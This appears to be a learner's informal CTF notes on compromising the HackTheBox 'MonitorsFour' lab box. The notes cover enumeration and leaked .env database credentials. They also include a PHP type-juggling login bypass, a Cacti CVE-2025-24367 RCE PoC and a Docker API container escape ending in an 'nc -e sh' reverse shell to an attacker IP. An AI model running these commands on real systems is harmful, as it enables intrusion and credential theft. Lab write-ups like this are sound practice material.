new idea.

store ip in `./IP` so we don't keep embedding it everywhere. no more stale data, yaya!!!!

also. sick of being a script kiddie, let's try a fresh box with no solution yet. seasonal.

```bash
nmap $(cat ./IP) -sS -sV -p-

rustscan -a $(cat ./IP) -- 

# sudo su first.
export IP=$(cat ./IP)
echo  "$IP monitorsfour.htb" >> /etc/hosts

```

rustscan is a bit faster.

2 ports open:
- 80 http
- 5985 wsman (some powershell remote mgmt tool? idk)

need to edit /etc/hosts. i remembered!!!

    http://monitorsfour.htb/login

    POST http://monitorsfour.htb/api/v1/auth
    BODY www-urlencoded

    http://monitorsfour.htb/static/admin/assets/js/core/app.js
    nope. boring. nothing cool in client side JS.

    hm. let's poke tcp packets at 5985.

    weird!!! why is it replying with...a different web server?

    http://monitorsfour.htb:5985/

    let's...dirb?

    wait. ooh. http://monitorsfour.htb/forgot-password

    reset password.

    useful data?

    sales@monitorsfour.htb
    
    <span class="review-name">Nicola Johnson</span>
    <span class="review-desig">(IT Manager, TechCorp)</span>

    <span class="review-name">Glenn Jones</span>
    <span class="review-desig">(CEO, BizSolutions)</span>


okay. cheaty cheaty.
initially, tool use is totally different..

https://medium.com/@Root_Fabric/hackthebox-monitorsfour-4859add0b51c

    whatweb monitorsfour.htb
    nikto -h monitorsfour.htb

so, also `caido` seems to suck less that burp suite. not sure. it's newer, anyways.


not sure how this dude, `@Root_Fabric`, has found out how the `.env` file was exposed. guessing??

he also uses `ffuf`...

yeah. no shame. I just need to get this stuff down to muscle memory.
wow. `nikto` takes a long time.
yep. `.env` exists. it has creds, yay.

    ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403,404

cool. `ffuf`, `nikto`, and `whatweb` are really useful for web apps.


http://monitorsfour.htb/api/v1/auth

so, just try those creds.

DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r


apparently CVE-2024–42179 affects our non-standard port. `nmap $(cat ./IP) -sS -sV -p-` was not good enough, I think. oh, wait, no, it was fine..

Our author just happens to know this about Microsoft HTTPAPI httpd 2.0, that it's vulnerable.

so, on to metasploit, i guess. `msfconsole`

OK! nevermind. from the guide, our wonderful hacker friend decides to do a subdomain enum next.

    ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3

subdomain get.

"cacti.monitorsfour.htb"
don't forget to edit /etc/hosts.

Version 1.2.28 | (c) 2004-2026 - The Cacti Group

https://www.cvedetails.com/version/1907377/Cacti-Cacti-1.2.28.html

https://www.cvedetails.com/cve/CVE-2025-24367/

exploit/linux/http/cacti_unauthenticated_cmd_injection

apparently we can exploit "type juggling" to...do something.

    curl http://monitorsfour.htb/user?token=AAAA

    curl http://monitorsfour.htb/user

we can use this to steal tokens, combined with this fact from PHP:

    Specific “Magic Hashes” (strings starting with `0e` followed by numbers) are treated as scientific notation (float) `0` by PHP during loose comparison.

let's try some of this on our own without peeking.

well. i have no clue why it worked, but we're further along.

    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "password_": "wonderful1"


http://monitorsfour.htb/admin/api

neat. api key gen. wonder what we can use it for.

http://monitorsfour.htb/admin/changelog


useful. changelog.

so.

cacti login is 

    marcus
    wonderful1
    
the admin's name is marcus.

okay.

so apparently CVE-2025–24367 gives us RCE if we're authenticated.

https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC

```bash
export ATTACKER_IP=10.10.14.175
nc -nvlp 4444

python CVE-2025–24367.py -u 'marcus' -p 'wonderful1' -i $ATTACKER_IP -l 4444 --url 'http://cacti.monitorsfour.htb'
```

hooray!! we have a shell. it sucks a bit, but, it's a shell!!

I'm going to ask z.ai what I should do next. user flag gotten!!

dang. z.ai is smart.

so i told it we have a crappy shell, but A SHELL is still useful than NO SHELL

(so no shell? (sounds of incredible muffled violence))

getting root inside the docker container is probably a waste of our time? not sure.

    Exploiting Docker Engine API
    The Docker Engine API was accessible at http://192.168.65.7:2375. A new privileged container was created with host filesystem access to escape to the host.

no way I was going to get this on my own, but, it's okay. I'm still learning.

okay.

## escaping a WSL docker container to the host

### 1. find the host IP.
    
    cat /etc/resolv.conf
    
### 2. make sure the docker API is accessible.

    curl http://192.168.65.7:2375/version

    curl -s http://192.168.65.7:2375/images/json


### 3. escape!

    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["sh","-c","cat /mnt/root/mnt/c/Users/Administrator/Desktop/root.txt"]}' http://192.168.65.7:2375/containers/create

    {"Id":"46bc73289f7bbc8f889409f53875845589d9188eb6ac4eda4096ab06726f3808","Warnings":[]}

#### start container and steal flag

    curl -X POST http://192.168.65.7:2375/containers/46bc73289f7bbc8f889409f53875845589d9188eb6ac4eda4096ab06726f3808/start


    curl http://192.168.65.7:2375/containers/46bc73289f7bbc8f889409f53875845589d9188eb6ac4eda4096ab06726f3808/logs?stdout=1


not working, sadly. let's work w/ z.ai to get it to work.


    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["ls","/mnt/root/mnt/c/Users"]}' http://192.168.65.7:2375/containers/create

     f86577b7033133d291420b9a11517ea5de4f0a7ed4c32923b672495154cbbc5c


    curl -X POST http://192.168.65.7:2375/containers/<NEW_ID>/start
    curl -X POST http://192.168.65.7:2375/containers/f86577b7033133d291420b9a11517ea5de4f0a7ed4c32923b672495154cbbc5c/start

    curl http://192.168.65.7:2375/containers/<NEW_ID>/logs?stdout=1
    curl http://192.168.65.7:2375/containers/f86577b7033133d291420b9a11517ea5de4f0a7ed4c32923b672495154cbbc5c/logs?stdout=1


nope..


from z.ai:

    The empty logs suggest the path /mnt/c either doesn't exist on that specific WSL2 host or is empty. Since we only grabbed stdout=1, we didn't see the error message (which usually goes to stderr).


    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["ls","/mnt/root"]}' http://192.168.65.7:2375/containers/create
        {"Id":"70f7d5ccb99019a0ae261fd9ae8d581470a6471a0caa84a5342c15b186320324","Warnings":[]}

    curl -X POST http://192.168.65.7:2375/containers/<NEW_ID>/start
    curl -X POST http://192.168.65.7:2375/containers/70f7d5ccb99019a0ae261fd9ae8d581470a6471a0caa84a5342c15b186320324/start

    curl http://192.168.65.7:2375/containers/<NEW_ID>/logs?stdout=1
    curl http://192.168.65.7:2375/containers/70f7d5ccb99019a0ae261fd9ae8d581470a6471a0caa84a5342c15b186320324/logs?stdout=1


```
www-data@821fbd6a43fa:~/html/cacti$ curl http://192.168.65.7:2375/containers/70f7d5ccb99019a0ae261fd9ae8d581470a6471a0caa84a5342c15b186320324/logs?stdout=1
<d581470a6471a0caa84a5342c15b186320324/logs?stdout=1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   523    0   523    0     0  66974      0 --:--:-- --:--:-- --:--:-- 74714
EFI
bin
boot
bpf-legacy.o
bpf.o

containers
dev

dpkg.orig
etc
home
host-network.o
	host_mnt
init
lib
lib64
media
mnt
mutagen-file-shares
mutagen-file-shares-mark
opt
parent-distro
proc
	pwatch.o
root
run
sbin
	services
src
srv
sys
tmp

udpv6csum.o
usr
var
www-data@821fbd6a43fa:~/html/cacti$ 
```
yay! our container prints to stdout.


okay.

so z.ai thinks we should use bind mounts to be able to get the root flag.

the CTF guide i followed uses a different method, but let's be strange for abit an use bind mount.

```z.ai
Awesome progress! Seeing the file system layout is the breakthrough.

I notice there is a root folder in that list. On a Linux system, the root user's personal files are stored in /root. Since you mounted the host's root to /mnt/root, the path to the root flag is likely /mnt/root/root/root.txt.

Let's try reading that.
```


    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["cat","/mnt/root/root/root.txt"]}' http://192.168.65.7:2375/containers/create
    {"Id":"5723da324b64f401daae88fc49c69806807bdc803d4f03de8acfc53b692de631","Warnings":[]}

    curl -X POST http://192.168.65.7:2375/containers/5723da324b64f401daae88fc49c69806807bdc803d4f03de8acfc53b692de631/start
    curl http://192.168.65.7:2375/containers/5723da324b64f401daae88fc49c69806807bdc803d4f03de8acfc53b692de631/logs?stdout=1

nope. i think we should just copy @Root_Fabric method.


```bash
    ip a # gives us 10.10.14.175 for attacker ip
    nc -nvlp 4455 # run as attacker

    curl -X POST -H "Content-Type: application/json" --data '{"Image":"alpine:latest","HostConfig":{"Binds":["/:/mnt/root"],"Privileged":true},"Cmd":["sh","-c","nc 10.10.14.175 4455 -e sh"]}' http://192.168.65.7:2375/containers/create
    {"Id":"4921307fdf5caec595d281a6e2828a4a5ed0f888e3ec66f6d9deda6683dd631c","Warnings":[]}

    curl -X POST http://192.168.65.7:2375/containers/4921307fdf5caec595d281a6e2828a4a5ed0f888e3ec66f6d9deda6683dd631c/start

```


we are root! but mount seems empty sadly.


ls /mnt/root/mnt/host/c/Users/Administrator/Desktop/root.txt
cat /mnt/root/mnt/host/c/Users/Administrator/Desktop/root.txt

yes!!!!!!! yayaaaaa!!!!!!!
